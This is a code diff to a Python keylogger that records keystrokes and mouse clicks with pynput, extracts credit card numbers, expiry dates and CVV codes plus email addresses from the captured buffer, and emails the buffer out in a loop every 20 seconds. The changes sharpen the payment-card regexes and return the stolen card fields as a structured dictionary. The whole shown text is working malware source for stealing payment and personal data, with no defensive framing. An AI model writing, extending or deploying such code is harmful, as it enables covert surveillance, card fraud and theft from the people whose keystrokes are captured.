@@ -6,10 +6,8 @@ import re
 from pynput.mouse import Listener
 
 CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
-CREDIT_CARD_EXPIRY_REGEXP = re.compile(
-    CREDIT_CARD_NUMBER_REGEXP.pattern + "[\t]?[0-9]{2}[\t ,\\/]?[0-9]{2}"
-)
-CREDIT_CARD_CVV_REGEXP = re.compile(CREDIT_CARD_NUMBER_REGEXP)
+CREDIT_CARD_EXPIRY_REGEXP = re.compile("[\t]?(?:!CLICK!)?[\n]?([0-9]{2}[\t ,\\\/]?[0-9]{2})")
+CREDIT_CARD_CVV_REGEXP = re.compile(CREDIT_CARD_NUMBER_REGEXP.pattern + "(?:" + CREDIT_CARD_EXPIRY_REGEXP.pattern + ")[\t]?(?:!CLICK!)?[\n]?" + "([0-9]{3})")
 
 
 class Keylogger:
@@ -57,12 +55,16 @@ class Keylogger:
     # Gets any credit card info from the local buffer (credit card number, expiry date, cvv number)
     def __get_credit_card_info(self, buffer: str) -> list:
         credit_card_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
-        credit_card_expiry_dates = re.findall(
-            CREDIT_CARD_EXPIRY_REGEXP, "123456789012\t0622"
-        )
-        credit_card_cvv_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
+        expiry_dates = re.findall(re.compile(CREDIT_CARD_NUMBER_REGEXP.pattern + CREDIT_CARD_EXPIRY_REGEXP.pattern), buffer)
+        credit_card_cvv_numbers = [x[1] for x in re.findall(CREDIT_CARD_CVV_REGEXP, buffer)]
 
-        return credit_card_numbers
+        INFO = {
+            "creditCardNumbers": credit_card_numbers,
+            "expiryDates": expiry_dates,
+            "cvvNumbers": credit_card_cvv_numbers}
+
+
+        return INFO
 
     def __get_emails(self, buffer: str) -> list:
         emails = re.findall("[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+", buffer)
@@ -130,7 +132,7 @@ class Keylogger:
 
         emailer = Emailer(self.email, self.password)
         while True:
-            time.sleep(5)
+            time.sleep(20)
             self.__email_local_buffer(emailer)
 
 
